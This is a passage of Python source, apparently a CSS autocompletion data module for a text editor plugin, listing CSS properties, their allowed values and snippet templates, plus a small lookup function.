\"\"],\n        \"text-indent\": [\"\", \"hanging\", \"each-line\"],\n        \"text-justify\": [\n            \"auto\",\n            \"distribute\",\n            \"distribute-all-lines\",\n            \"inter-character\",\n            \"inter-cluster\",\n            \"inter-ideograph\",\n            \"inter-word\",\n            \"kashida\",\n            \"newspaper\",\n            \"none\",\n        ],\n        \"text-orientation\": [\"mixed\", \"upright\", \"sideways\", \"use-glyph-orientation\"],\n        \"text-overflow\": [\"\", \"clip\", \"ellipsis\"],\n        \"text-rendering\": [\n            \"auto\",\n            \"optimizeSpeed\",\n            \"optimizeLegibility\",\n            \"geometricPrecision\",\n        ],\n        \"text-shadow\": [\"\", \"none\"],\n        \"text-size-adjust\": [\"\", \"auto\", \"none\"],\n        \"text-transform\": [\n            \"capitalize\",\n            \"full-size-kana\",\n            \"full-width\",\n            \"uppercase\",\n            \"lowercase\",\n            \"none\",\n        ],\n        \"text-underline-offset\": [\"\", \"auto\"],\n        \"text-underline-position\": [\"auto\", \"under\", \"left\", \"right\"],\n        \"top\": [\"\", \"auto\"],\n        \"touch-action\": [\n            \"auto\",\n            \"cross-slide-x\",\n            \"cross-slide-y\",\n            \"double-tap-zoom\",\n            \"manipulation\",\n            \"none\",\n            \"pan-down\",\n            \"pan-left\",\n            \"pan-right\",\n            \"pan-up\",\n            \"pan-x\",\n            \"pan-y\",\n            \"pinch-zoom\",\n        ],\n        \"transform\": [\n            \"none\",\n            [\"matrix()\", \"matrix(${1:1}, ${2:1}, ${3:1}, ${4:1}, ${5:2}, ${6:2})\"],\n            [\n                \"matrix3d()\",\n                \"matrix3d(${1:1}, ${2:1}, ${3:0}, ${4:0}, ${5:1}, ${6:1}, ${7:0}, ${8:0}, ${9:0}, ${10:0}, ${11:1}, ${12:0}, ${13:2}, ${14:2}, ${15:0}, ${16:1})\",\n            ],\n            [\"perspective()\", \"perspective(${1:0})\"],\n            [\"rotate()\", \"rotate(${1:45deg})\"],\n            [\"rotate3d()\", \"rotate3d(${1:0}, ${2:0}, ${3:1}, ${4:45deg})\"],\n            [\"rotateX()\", \"rotateX(${1:45deg})\"],\n            [\"rotateY()\", \"rotateY(${1:45deg})\"],\n            [\"rotateZ()\", \"rotateZ(${1:45deg})\"],\n            [\"scale()\", \"scale(${1:1.0})\"],\n            [\"scale3d()\", \"scale3d(${1:1.0}, ${2:1.0}, ${3:1.0})\"],\n            [\"scaleX()\", \"scaleX(${1:1.0})\"],\n            [\"scaleY()\", \"scaleY(${1:1.0})\"],\n            [\"scaleZ()\", \"scaleZ(${1:1.0})\"],\n            [\"skew()\", \"skew(${1:10deg})\"],\n            [\"skewX()\", \"skewX(${1:10deg})\"],\n            [\"skewY()\", \"skewY(${1:10deg})\"],\n            [\"translate()\", \"translate(${1:10px})\"],\n            [\"translate3d()\", \"translate3d(${1:10px}, ${2:0px}, ${3:0px})\"],\n            [\"translateX()\", \"translateX(${1:10px})\"],\n            [\"translateY()\", \"translateY(${1:10px})\"],\n            [\"translateZ()\", \"translateZ(${1:10px})\"],\n        ],\n        \"transform-box\": [\n            \"border-box\",\n            \"content-box\",\n            \"fill-box\",\n            \"stroke-box\",\n            \"view-box\",\n        ],\n        \"transform-origin\": [\"\", \"\"],\n        \"transform-style\": [\"preserve-3d\", \"flat\"],\n        \"transition\": [\n            \"\",\n            \"\",\n            \"all\",\n            \"none\",\n        ],\n        \"transition-delay\": [\n            \"\",\n        ],\n        \"transition-duration\": [\n            \"\",\n        ],\n        \"transition-property\": [\n            \"all\",\n            \"none\",\n        ],\n        \"transition-timing-function\": [\"\", \"\"],\n        \"translate\": [\"\", \"none\"],\n        \"unicode-bidi\": [\n            \"bidi-override\" \"embed\",\n            \"isolate\",\n            \"isolate-override\",\n            \"normal\",\n            \"plaintext\",\n        ],\n        \"unicode-range\": [],\n        \"user-select\": [\"all\", \"auto\", \"text\", \"none\", \"contain\"],\n        \"user-zoom\": [\"fixed\", \"zoom\"],\n        \"vertical-align\": [\n            \"\",\n            \"baseline\",\n            \"sub\",\n            \"super\",\n            \"text-top\",\n            \"text-bottom\",\n            \"middle\",\n            \"top\",\n            \"bottom\",\n        ],\n        \"viewport-fit\": [\"auto\", \"contain\", \"cover\"],\n        \"visibility\": [\"visible\", \"hidden\", \"collapse\"],\n        \"white-space\": [\n            \"break-spaces\",\n            \"normal\",\n            \"pre\",\n            \"nowrap\",\n            \"pre-wrap\",\n            \"pre-line\",\n        ],\n        \"widows\": [\n            \"\",\n        ],\n        \"width\": [\"\", \"auto\", \"fit-content\"],\n        \"will-change\": [\n            \"auto\",\n            \"contents\",\n            \"scroll-position\",\n        ],\n        \"word-break\": [\"normal\", \"break-all\", \"break-word\", \"keep-all\"],\n        \"word-spacing\": [\n            \"\",\n            \"normal\",\n        ],\n        \"word-wrap\": [\"normal\", \"break-word\"],\n        \"writing-mode\": [\n            \"horizontal-tb\",\n            \"vertical-rl\",\n            \"vertical-lr\",\n            \"sideways-rl\",\n            \"sideways-lr\",\n        ],\n        \"z-index\": [\n            \"\",\n            \"auto\",\n        ],\n        \"zoom\": [\"\", \"auto\", \"normal\", \"reset\"],\n    }\n\n\nfor_all = [\n    'inherit',\n    'initial',\n    'revert',\n    'revert-layer',\n    'unset',\n    'var()',\n    '!important'\n    ]\n\n\n# pre-process keys which have \" | \" separators\nfor k in props.copy(): # copy() is required\n    if ' | ' in k:\n        val = props[k]\n        del props[k]\n        for kk in k.split(' | '):\n            props[kk] = val\n\n\ndef get_data(name):\n    #get list of properties\n    if not name:\n        return list(props.keys())\n\n    #get list of values for property\n    r = []\n    values = props.get(name, [])\n    for val in values:\n        if type(val) is str:\n            if val.startswith('<') and val.endswith('>'):\n                more = common_values.get(val[1:-1], [])\n                for m in more:\n                    if type(m) is str:\n                        r.append(m)\n                    elif type(m) is list:\n                        r.append(m[0])\n            else:\n                r.append(val)\n        elif type(val) is list:\n            r.append(val[0])\n    r += for_all\n    return r\n", "540": "# Two main variables are taken from repository:\n# https://github.com/sublimehq/Packages/blob/master/CSS/\n# which has the following license:\n#############\n# If not otherwise specified (see below), files in this repository fall under the following license:\n#\n#     Permission to copy, use, modify, sell and distribute this\n#     software is granted. This software is provided \"as is\" without\n#     express or implied warranty, and with no claim as to its\n#     suitability for any purpose.\n#\n# An exception is made for files in readable text which contain their own license information, or files where an accompanying file exists (in the same directory) with a \u201c-license\u201d suffix added to the base-name name of the original file, and an extension of txt, html, or similar. For example \u201ctidy\u201d is accompanied by \u201ctidy-license.txt\u201d.\n#############\n\ncommon_values = {\n        \"animation-direction\": [\"alternate\", \"alternate-reverse\", \"normal\", \"reverse\"],\n        \"absolute-size\": [\n            \"xx-small\",\n            \"x-small\",\n            \"small\",\n            \"medium\",\n            \"large\",\n            \"x-large\",\n            \"xx-large\",\n        ],\n        \"absolute-weight\": [\n            \"100\",\n            \"200\",\n            \"300\",\n            \"400\",\n            \"500\",\n            \"600\",\n            \"700\",\n            \"800\",\n            \"900\",\n            \"normal\",\n            \"bold\",\n        ],\n        \"basic-shape\": [\n            [\"circle()\", \"circle($1)\"],\n            [\"ellipse()\", \"ellipse($1)\"],\n            [\"inset()\", \"inset($1)\"],\n            [\"polygon()\", \"polygon($1)\"],\n        ],\n        \"blend-mode\": [\n            \"normal\",\n            \"multiply\",\n            \"screen\",\n            \"overlay\",\n            \"darken\",\n            \"lighten\",\n            \"color-dodge\",\n            \"color-burn\",\n            \"hard-light\",\n            \"soft-light\",\n            \"difference\",\n            \"exclusion\",\n            \"hue\",\n            \"saturation\",\n            \"color\",\n            \"luminosity\",\n        ],\n        \"border-style\": [\n            \"none\",\n            \"hidden\",\n            \"dotted\",\n            \"dashed\",\n            \"solid\",\n            \"double\",\n            \"groove\",\n            \"ridge\",\n            \"inset\",\n            \"outset\",\n        ],\n        \"border-width\": [\"thin\", \"medium\", \"thick\"],\n        \"break-before-after\": [\n            \"always\",\n            \"left\",\n            \"right\",\n            \"recto\",\n            \"verso\",\n            \"page\",\n            \"column\",\n            \"region\",\n        ],\n        \"break-inside\": [\"auto\", \"avoid\", \"avoid-page\", \"avoid-column\", \"avoid-region\"],\n        \"calc\": [\n            [\"calc()\", \"calc($1)\"],\n            [\"clamp()\", \"clamp(${1:0}, ${2:0}, ${3:0})\"],\n            [\"max()\", \"max(${1:0}, ${2:0})\"],\n            [\"min()\", \"min(${1:0}, ${2:0})\"],\n        ],\n        \"color\": [\n            \"currentColor\",\n            \"transparent\",\n            [\"rgb()\", \"rgb(${1:0}, ${2:0}, ${3:0})\"],\n            [\"rgba()\", \"rgba(${1:0}, ${2:0}, ${3:0}, ${4:1.0})\"],\n            [\"hsl()\", \"hsl(${1:0}, ${2:100%}, ${3:50%})\"],\n            [\"hsla()\", \"hsla(${1:0}, ${2:100%}, ${3:50%}, ${4:1.0})\"],\n            # Named colors\n            \"aliceblue\",\n            \"antiquewhite\",\n            \"aqua\",\n            \"aquamarine\",\n            \"azure\",\n            \"beige\",\n            \"bisque\",\n            \"black\",\n            \"blanchedalmond\",\n            \"blue\",\n            \"blueviolet\",\n            \"brown\",\n            \"burlywood\",\n            \"cadetblue\",\n            \"chartreuse\",\n            \"chocolate\",\n            \"coral\",\n            \"cornflowerblue\",\n            \"cornsilk\",\n            \"crimson\",\n            \"cyan\",\n            \"darkblue\",\n            \"darkcyan\",\n            \"darkgoldenrod\",\n            \"darkgray\",\n            \"darkgrey\",\n            \"darkgreen\",\n            \"darkkhaki\",\n            \"darkmagenta\",\n            \"darkolivegreen\",\n            \"darkorange\",\n            \"darkorchid\",\n            \"darkred\",\n            \"darksalmon\",\n            \"darkseagreen\",\n            \"darkslateblue\",\n            \"darkslategray\",\n            \"darkslategrey\",\n            \"darkturquoise\",\n            \"darkviolet\",\n            \"deeppink\",\n            \"deepskyblue\",\n            \"dimgray\",\n            \"dimgrey\",\n            \"dodgerblue\",\n            \"firebrick\",\n            \"floralwhite\",\n            \"forestgreen\",\n            \"fuchsia\",\n            \"gainsboro\",\n            \"ghostwhite\",\n            \"gold\",\n            \"goldenrod\",\n            \"gray\",\n            \"grey\",\n            \"green\",\n            \"greenyellow\",\n            \"honeydew\",\n            \"hotpink\",\n            \"indianred\",\n            \"indigo\",\n            \"ivory\",\n            \"khaki\",\n            \"lavender\",\n            \"lavenderblush\",\n            \"lawngreen\",\n            \"lemonchiffon\",\n            \"lightblue\",\n            \"lightcoral\",\n            \"lightcyan\",\n            \"lightgoldenrodyellow\",\n            \"lightgray\",\n            \"lightgrey\",\n            \"lightgreen\",\n            \"lightpink\",\n            \"lightsalmon\",\n            \"lightseagreen\",\n            \"lightskyblue\",\n            \"lightslategray\",\n            \"lightslategrey\",\n            \"lightsteelblue\",\n            \"lightyellow\",\n            \"lime\",\n            \"limegreen\",\n            \"linen\",\n            \"magenta\",\n            \"maroon\",\n            \"mediumaquamarine\",\n            \"mediumblue\",\n            \"mediumorchid\",\n            \"mediumpurple\",\n            \"mediumseagreen\",\n            \"mediumslateblue\",\n            \"mediumspringgreen\",\n            \"mediumturquoise\",\n            \"mediumvioletred\",\n            \"midnightblue\",\n            \"mintcream\",\n            \"mistyrose\",\n            \"moccasin\",\n            \"navajowhite\",\n            \"navy\",\n            \"oldlace\",\n            \"olive\",\n            \"olivedrab\",\n            \"orange\",\n            \"orangered\",\n            \"orchid\",\n            \"palegoldenrod\",\n            \"palegreen\",\n            \"paleturquoise\",\n            \"palevioletred\",\n            \"papayawhip\",\n            \"peachpuff\",\n            \"peru\",\n            \"pink\",\n            \"plum\",\n            \"powderblue\",\n            \"purple\",\n            \"rebeccapurple\",\n            \"red\",\n            \"rosybrown\",\n            \"royalblue\",\n            \"saddlebrown\",\n            \"salmon\",\n            \"sandybrown\",\n            \"seagreen\",\n            \"seashell\",\n            \"sienna\",\n            \"silver\",\n            \"skyblue\",\n            \"slateblue\",\n            \"slategray\",\n            \"slategrey\",\n            \"snow\",\n            \"springgreen\",\n            \"steelblue\",\n            \"tan\",\n            \"teal\",\n            \"thistle\",\n            \"tomato\",\n            \"turquoise\",\n            \"violet\",\n            \"wheat\",\n            \"white\",\n            \"whitesmoke\",\n            \"yellow\",\n            \"yellowgreen\",\n        ],\n        \"counter-style\": [[\"symbols()\", \"symbols($1)\"]],\n        \"counter-symbols\": [\n            \"cyclic\",\n            \"numeric\",\n            \"alphabetic\",\n            \"symbolic\",\n            \"additive\",\n            \"fixed\",\n        ],\n        \"ending-shape\": [\"circle\", \"ellipse\"],\n        \"fill-rule\": [\"nonzero\", \"evenodd\"],\n        \"filter-function\": [\n            [\"blur()\", \"blur($1)\"],\n            [\"brightness()\", \"brightness($1)\"],\n            [\"contrast()\", \"contrast($1)\"],\n            [\"drop-shadow()\", \"drop-shadow($1)\"],\n            [\"grayscale()\", \"grayscale($1)\"],\n            [\"hue-rotate()\", \"hue-rotate($1)\"],\n            [\"invert()\", \"invert($1)\"],\n            [\"opacity()\", \"opacity($1)\"],\n            [\"saturate()\", \"saturate($1)\"],\n            [\"sepia()\", \"sepia($1)\"],\n        ],\n        \"font-variant-alternates\": [\n            \"normal\",\n            \"historical-forms\",\n            [\"stylistic()\", \"stylistic($1)\"],\n            [\"styleset()\", \"styleset($1)\"],\n            [\"character-variant()\", \"character-variant($1)\"],\n            [\"swash()\", \"swash($1)\"],\n            [\"ornaments()\", \"ornaments($1)\"],\n            [\"annotation()\", \"annotation($1)\"],\n        ],\n        \"generic-font-name\": [\n            \"serif\",\n            \"sans-serif\",\n            \"cursive\",\n            \"fantasy\",\n            \"monospace\",\n        ],\n        \"gradient\": [\n            [\"conic-gradient()\", \"conic-gradient($1)\"],\n            [\"linear-gradient()\", \"linear-gradient($1)\"],\n            [\"radial-gradient()\", \"radial-gradient($1)\"],\n            [\"repeating-conic-gradient()\", \"repeating-conic-gradient($1)\"],\n            [\"repeating-linear-gradient()\", \"repeating-linear-gradient($1)\"],\n            [\"repeating-radial-gradient()\", \"repeating-radial-gradient($1)\"],\n        ],\n        \"grid\": [\n            [\"repeat()\", \"repeat(${1:2}, ${2:1fr})\"],\n            [\"minmax()\", \"minmax(${1:100px}, ${2:1fr})\"],\n        ],\n        \"image\": [\n            \"\",\n            [\"image()\", \"image($1)\"],\n            [\"image-set()\", \"image-set($1)\"],\n            [\"element()\", \"element($1)\"],\n            [\"paint()\", \"paint($1)\"],\n            [\"cross-fade()\", \"cross-fade($1)\"],\n            [\"linear-gradient()\", \"linear-gradient($1)\"],\n            [\"repeating-linear-gradient()\", \"repeating-linear-gradient($1)\"],\n            [\"radial-gradient()\", \"radial-gradient($1)\"],\n            [\"repeating-radial-gradient()\", \"repeating-radial-gradient($1)\"],\n            [\"conic-gradient()\", \"conic-gradient($1)\"],\n        ],\n        \"image-tags\": [\"ltr\", \"rtl\"],\n        \"line-style\": [\n            \"none\",\n            \"hidden\",\n            \"dotted\",\n            \"dashed\",\n            \"solid\",\n            \"double\",\n            \"groove\",\n            \"ridge\",\n            \"inset\",\n            \"outset\",\n        ],\n        \"leader-type\": [\"dotted\", \"solid\", \"space\"],\n        \"list-style-type\": [\n            \"none\",\n            \"inline\",\n            \"disc\",\n            \"circle\",\n            \"square\",\n            \"decimal\",\n            \"decimal-leading-zero\",\n            \"arabic-indic\",\n            \"binary\",\n            \"bengali\",\n            \"cambodian\",\n            \"khmer\",\n            \"devanagari\",\n            \"gujarati\",\n            \"gurmukhi\",\n            \"kannada\",\n            \"lower-hexadecimal\",\n            \"lao\",\n            \"malayalam\",\n            \"mongolian\",\n            \"myanmar\",\n            \"octal\",\n            \"oriya\",\n            \"persian\",\n            \"urdu\",\n            \"telugu\",\n            \"tibetan\",\n            \"thai\",\n            \"upper-hexadecimal\",\n            \"lower-roman\",\n            \"upper-roman\",\n            \"lower-greek\",\n            \"lower-alpha\",\n            \"lower-latin\",\n            \"upper-alpha\",\n            \"upper-latin\",\n            \"afar\",\n            \"ethiopic-halehame-aa-et\",\n            \"ethiopic-halehame-aa-er\",\n            \"amharic\",\n            \"ethiopic-halehame-am-et\",\n            \"amharic-abegede\",\n            \"ethiopic-abegede-am-et\",\n            \"cjk-earthly-branch\",\n            \"cjk-heavenly-stem\",\n            \"ethiopic\",\n            \"ethiopic-halehame-gez\",\n            \"ethiopic-abegede\",\n            \"ethiopic-abegede-gez\",\n            \"hangul-consonant\",\n            \"hangul\",\n            \"lower-norwegian\",\n            \"oromo\",\n            \"ethiopic-halehame-om-et\",\n            \"sidama\",\n            \"ethiopic-halehame-sid-et\",\n            \"somali\",\n            \"ethiopic-halehame-so-et\",\n            \"tigre\",\n            \"ethiopic-halehame-tig\",\n            \"tigrinya-er\",\n            \"ethiopic-halehame-ti-er\",\n            \"tigrinya-er-abegede\",\n            \"ethiopic-abegede-ti-er\",\n            \"tigrinya-et\",\n            \"ethiopic-halehame-ti-et\",\n            \"tigrinya-et-abegede\",\n            \"ethiopic-abegede-ti-et\",\n            \"upper-greek\",\n            \"upper-norwegian\",\n            \"asterisks\",\n            \"footnotes\",\n            \"hebrew\",\n            \"armenian\",\n            \"lower-armenian\",\n            \"upper-armenian\",\n            \"georgian\",\n            \"cjk-ideographic\",\n            \"hiragana\",\n            \"katakana\",\n            \"hiragana-iroha\",\n            \"katakana-iroha\",\n        ],\n        \"position\": [\"\", \"center\"],\n        \"relative-size\": [\"larger\", \"smaller\"],\n        \"relative-weight\": [\"bolder\", \"lighter\"],\n        \"repeat-style\": [\n            \"repeat\",\n            \"repeat-x\",\n            \"repeat-y\",\n            \"space\",\n            \"round\",\n            \"no-repeat\",\n        ],\n        \"self-position\": [\n            \"center\",\n            \"start\",\n            \"end\",\n            \"self-start\",\n            \"self-end\",\n            \"flex-start\",\n            \"flex-end\",\n        ],\n        \"shape-radius\": [\"closest-side\", \"farthest-side\"],\n        \"side-or-corner\": [\"left\", \"right\", \"top\", \"bottom\"],\n        \"timing-function\": [\n            \"linear\",\n            \"ease\",\n            \"ease-in\",\n            \"ease-out\",\n            \"ease-in-out\",\n            \"step-start\",\n            \"step-end\",\n            [\"cubic-bezier()\", \"cubic-bezier(${1:0.0}, ${2:0.0}, ${3:1.0}, ${4:1.0})\"],\n            [\"steps()\", \"steps(${1:2}, ${2:start})\"],\n        ],\n        \"type-or-unit\": [\n            \"string\",\n            \"color\",\n            \"url\",\n            \"integer\",\n            \"number\",\n            \"length\",\n            \"angle\",\n            \"time\",\n            \"frequency\",\n            \"cap\",\n            \"ch\",\n            \"em\",\n            \"ex\",\n            \"ic\",\n            \"lh\",\n            \"rlh\",\n            \"rem\",\n            \"vb\",\n            \"vi\",\n            \"vw\",\n            \"vh\",\n            \"vmin\",\n            \"vmax\",\n            \"mm\",\n            \"Q\",\n            \"cm\",\n            \"in\",\n            \"pt\",\n            \"pc\",\n            \"px\",\n            \"deg\",\n            \"grad\",\n            \"rad\",\n            \"turn\",\n            \"ms\",\n            \"s\",\n            \"Hz\",\n            \"kHz\",\n            \"%\",\n        ],\n        \"url\": [[\"url()\", \"url($1)\"]],\n    }\n\n\nprops = {\n        \"accent-color\": [\"auto\", \"\", \"\"],\n        \"additive-symbols\": [],\n        \"align-content\": [\n            \"center\",\n            \"flex-end\",\n            \"flex-start\",\n            \"space-around\",\n            \"space-between\",\n            \"stretch\",\n        ],\n        \"align-items\": [\"baseline\", \"center\", \"flex-end\", \"flex-start\", \"stretch\"],\n        \"align-self\": [\n            \"auto\",\n            \"baseline\",\n            \"center\",\n            \"flex-end\",\n            \"flex-start\",\n            \"stretch\",\n        ],\n        \"align-tracks\": [\"normal\"],\n        \"all\": [],\n        \"alt\": [],\n        \"animation\": [\n            \"\",\n            \"\",\n            \"\",\n            \"none\",\n            \"infinite\",\n            \"forwards\",\n            \"backwards\",\n            \"both\",\n            \"running\",\n            \"paused\",\n        ],\n        \"animation-delay\": [\"\"],\n        \"animation-direction\": [\"\"],\n        \"animation-duration\": [\"\"],\n        \"animation-fill-mode\": [\"none\", \"forwards\", \"backwards\", \"both\"],\n        \"animation-iteration-count\": [\n            \"\",\n            \"infinite\",\n        ],\n        \"animation-name\": [\n            \"none\",\n        ],\n        \"animation-play-state\": [\"running\", \"paused\"],\n        \"animation-timing-function\": [\"\", \"\"],\n        \"appearance\": [\"auto\", \"menulist-button\", \"none\", \"textfield\"],\n        \"aspect-ratio\": [\"auto\"],\n        \"azimuth\": [\n            \"\",\n            \"behind\",\n            \"center\",\n            \"center-left\",\n            \"center-right\",\n            \"far-left\",\n            \"far-right\",\n            \"left\",\n            \"left-side\",\n            \"leftwards\",\n            \"right\",\n            \"right-side\",\n            \"rightwards\",\n        ],\n        \"backdrop-filter\": [\"none\"],\n        \"backface-visibility\": [\"visible\", \"hidden\"],\n        \"background\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"fixed\",\n            \"scroll\",\n        ],\n        \"background-attachment\": [\"fixed\", \"local\", \"scroll\"],\n        \"background-blend-mode\": [\"\"],\n        \"background-clip\": [\n            \"border-box\",\n            \"content-box\",\n            \"padding-box\",\n        ],\n        \"background-color\": [\"\"],\n        \"background-image\": [\"\", \"none\"],\n        \"background-origin\": [\n            \"border-box\",\n            \"content-box\",\n            \"padding-box\",\n        ],\n        \"background-position\": [\"\", \"\"],\n        \"background-position-x\": [\n            \"\",\n            \"center\",\n            \"left\",\n            \"right\",\n            \"x-end\",\n            \"x-start\",\n        ],\n        \"background-position-y\": [\n            \"\",\n            \"bottom\",\n            \"center\",\n            \"top\",\n            \"y-end\",\n            \"y-start\",\n        ],\n        \"background-repeat\": [\"\"],\n        \"background-size\": [\n            \"\",\n            \"auto\",\n            \"cover\",\n            \"contain\",\n        ],\n        \"behavior\": [],\n        \"bleed\": [\"auto\"],\n        \"block-size\": [\"\", \"auto\"],\n        \"border\": [\"\", \"\", \"\", \"\"],\n        \"border-block\": [\"\", \"\", \"\", \"\"],\n        \"border-block-color\": [\"\"],\n        \"border-block-end\": [\"\", \"\", \"\", \"\"],\n        \"border-block-end-color\": [\"\"],\n        \"border-block-end-style\": [\"\"],\n        \"border-block-end-width\": [\"\", \"\"],\n        \"border-block-start\": [\"\", \"\", \"\", \"\"],\n        \"border-block-start-color\": [\"\"],\n        \"border-block-start-style\": [\"\"],\n        \"border-block-start-width\": [\"\", \"\"],\n        \"border-block-style\": [\"\"],\n        \"border-block-width\": [\"\", \"\"],\n        \"border-bottom\": [\"\", \"\", \"\", \"\"],\n        \"border-bottom-color\": [\"\"],\n        \"border-bottom-left-radius\": [\"\"],\n        \"border-bottom-right-radius\": [\"\"],\n        \"border-bottom-style\": [\"\"],\n        \"border-bottom-width\": [\"\", \"\"],\n        \"border-collapse\": [\"collapse\", \"separate\"],\n        \"border-color\": [\"\"],\n        \"border-end-end-radius\": [\"\"],\n        \"border-end-start-radius\": [\"\"],\n        \"border-image\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"fill\",\n            \"none\",\n            \"repeat\",\n            \"round\",\n            \"space\",\n            \"stretch\",\n        ],\n        \"border-image-outset\": [],\n        \"border-image-repeat\": [\"stretch\", \"repeat\", \"round\", \"space\"],\n        \"border-image-slice\": [\n            \"\",\n            \"fill\",\n        ],\n        \"border-image-source\": [\"none\", \"\"],\n        \"border-image-width\": [\"\", \"auto\"],\n        \"border-inline\": [\"\", \"\", \"\", \"\"],\n        \"border-inline-color\": [\"\"],\n        \"border-inline-end\": [\"\", \"\", \"\", \"\"],\n        \"border-inline-end-color\": [\"\"],\n        \"border-inline-end-style\": [\"\"],\n        \"border-inline-end-width\": [\"\", \"\"],\n        \"border-inline-start\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"border-inline-start-color\": [\"\"],\n        \"border-inline-start-style\": [\"\"],\n        \"border-inline-start-width\": [\"\", \"\"],\n        \"border-inline-style\": [\"\"],\n        \"border-inline-width\": [\"\", \"\"],\n        \"border-left\": [\"\", \"\", \"\", \"\"],\n        \"border-left-color\": [\"\"],\n        \"border-left-style\": [\"\"],\n        \"border-left-width\": [\"\", \"\"],\n        \"border-radius\": [\"\"],\n        \"border-right\": [\"\", \"\", \"\", \"\"],\n        \"border-right-color\": [\"\"],\n        \"border-right-style\": [\"\"],\n        \"border-right-width\": [\"\", \"\"],\n        \"border-spacing\": [],\n        \"border-start-end-radius\": [\"\"],\n        \"border-start-start-radius\": [\"\"],\n        \"border-style\": [\"\"],\n        \"border-top\": [\"\", \"\", \"\", \"\"],\n        \"border-top-color\": [\"\"],\n        \"border-top-left-radius\": [\"\"],\n        \"border-top-right-radius\": [\"\"],\n        \"border-top-style\": [\"\"],\n        \"border-top-width\": [\"\", \"\"],\n        \"border-width\": [\"\", \"\"],\n        \"bottom\": [\"\", \"auto\"],\n        \"box-align\": [\"baseline\", \"center\", \"end\", \"start\", \"stretch\"],\n        \"box-decoration-break\": [\"slice\", \"clone\"],\n        \"box-direction\": [\"normal\", \"reverse\"],\n        \"box-flex\": [\"\"],\n        \"box-flex-group\": [\"\"],\n        \"box-lines\": [\"multiple\", \"single\"],\n        \"box-ordinal-group\": [\"\"],\n        \"box-orient\": [\"block-axis\", \"horizontal\", \"inline-axis\", \"vertical\"],\n        \"box-pack\": [\"center\", \"end\", \"justify\", \"start\"],\n        \"box-shadow\": [\"none\", \"inset\", \"\", \"\"],\n        \"box-sizing\": [\"content-box\", \"border-box\"],\n        \"break-after\": [\"\", \"\"],\n        \"break-before\": [\"\", \"\"],\n        \"break-inside\": [\"\"],\n        \"caption-side\": [\"top\", \"bottom\"],\n        \"caret-color\": [\"auto\", \"\"],\n        \"clear\": [\"none\", \"left\", \"right\", \"both\"],\n        \"clip\": [[\"rect()\", \"rect(${1:0}, ${2:0}, ${3:0}, ${4:0})\"], \"auto\"],\n        \"clip-path\": [\"none\", \"\", \"\"],\n        \"clip-rule\": [\"nonzero\", \"evenodd\"],\n        \"color\": [\"\"],\n        \"color-adjust\": [\"economy\", \"exact\"],\n        \"color-interpolation\": [\"auto\", \"sRGB\", \"linearRGB\"],\n        \"color-interpolation-filters\": [\"auto\", \"sRGB\", \"linearRGB\"],\n        \"column-count\": [\n            \"\",\n            \"auto\",\n        ],\n        \"column-fill\": [\"auto\", \"balance\"],\n        \"column-gap\": [\n            \"\",\n            \"normal\",\n        ],\n        \"column-rule\": [\"\", \"\", \"\", \"\"],\n        \"column-rule-color\": [\"\"],\n        \"column-rule-style\": [\"\"],\n        \"column-rule-width\": [\"\", \"\"],\n        \"column-span\": [\"\", \"none\"],\n        \"column-width\": [\n            \"\",\n            \"auto\",\n        ],\n        \"columns\": [\"\", \"auto\"],\n        \"contain\": [\"content\", \"layout\", \"none\", \"paint\", \"size\", \"strict\", \"style\"],\n        \"content\": [\n            \"none\",\n            \"normal\",\n            \"\",\n            \"\",\n            \"open-quote\",\n            \"close-quote\",\n            \"no-open-quote\",\n            \"no-close-quote\",\n            [\"attr()\", \"attr($1)\"],\n            [\"counter()\", \"counter($1)\"],\n        ],\n        \"content-visibility\": [\"auto\", \"hidden\", \"visible\"],\n        \"counter-increment\": [\n            \"\",\n            \"none\",\n        ],\n        \"counter-reset\": [\n            \"none\",\n        ],\n        \"counter-set\": [\"\", \"none\"],\n        \"cursor\": [\n            \"\",\n            \"auto\",\n            \"default\",\n            \"none\",\n            \"context-menu\",\n            \"help\",\n            \"pointer\",\n            \"progress\",\n            \"wait\",\n            \"cell\",\n            \"crosshair\",\n            \"text\",\n            \"vertical-text\",\n            \"alias\",\n            \"copy\",\n            \"move\",\n            \"no-drop\",\n            \"not-allowed\",\n            \"e-resize\",\n            \"n-resize\",\n            \"ne-resize\",\n            \"nw-resize\",\n            \"s-resize\",\n            \"se-resize\",\n            \"sw-resize\",\n            \"w-resize\",\n            \"ew-resize\",\n            \"ns-resize\",\n            \"nesw-resize\",\n            \"nwse-resize\",\n            \"col-resize\",\n            \"row-resize\",\n            \"all-scroll\",\n            \"zoom-in\",\n            \"zoom-out\",\n        ],\n        \"direction\": [\"ltr\", \"rtl\"],\n        \"display\": [\n            \"none\",\n            \"inline\",\n            \"inline-block\",\n            \"inline-table\",\n            \"inline-flex\",\n            \"inline-grid\",\n            \"block\",\n            \"contents\",\n            \"list-item\",\n            \"table\",\n            \"table-cell\",\n            \"table-column\",\n            \"table-column-group\",\n            \"table-footer-group\",\n            \"table-header-group\",\n            \"table-row\",\n            \"table-row-group\",\n            \"table-caption\",\n            \"flex\",\n            \"flow\",\n            \"flow-root\",\n            \"grid\",\n            \"ruby\",\n            \"ruby-base\",\n            \"ruby-text\",\n            \"ruby-base-container\",\n            \"ruby-text-container\",\n            \"run-in\",\n        ],\n        \"empty-cells\": [\"show\", \"hide\"],\n        \"enable-background\": [\"accumulate\", \"new\"],\n        \"fallback\": [],\n        \"fill\": [\"\"],\n        \"fill-opacity\": [\n            \"\",\n        ],\n        \"fill-rule\": [\"nonzero\", \"evenodd\"],\n        \"filter\": [\n            \"\",\n            [\"blur()\", \"blur(${1:5px})\"],\n            [\"brightness()\", \"brightness(${1:1.0})\"],\n            [\"contrast()\", \"contrast(${1:100%})\"],\n            [\"drop-shadow()\", \"drop-shadow(${1:1px} ${2:1px})\"],\n            [\"grayscale()\", \"grayscale(${1:50%})\"],\n            [\"hue-rotate()\", \"hue-rotate(${1:90deg})\"],\n            [\"invert()\", \"invert(${1:50%})\"],\n            [\"opacity()\", \"opacity(${1:100%})\"],\n            [\"saturate()\", \"saturate(${1:50%})\"],\n            [\"sepia()\", \"sepia(${1:50%})\"],\n        ],\n        \"flex\": [\n            \"\",\n            \"none\" \"auto\",\n        ],\n        \"flex-basis\": [\n            \"\",\n            \"auto\",\n        ],\n        \"flex-direction\": [\"row\", \"row-reverse\", \"column\", \"column-reverse\"],\n        \"flex-flow\": [\n            \"row\",\n            \"row-reverse\",\n            \"column\",\n            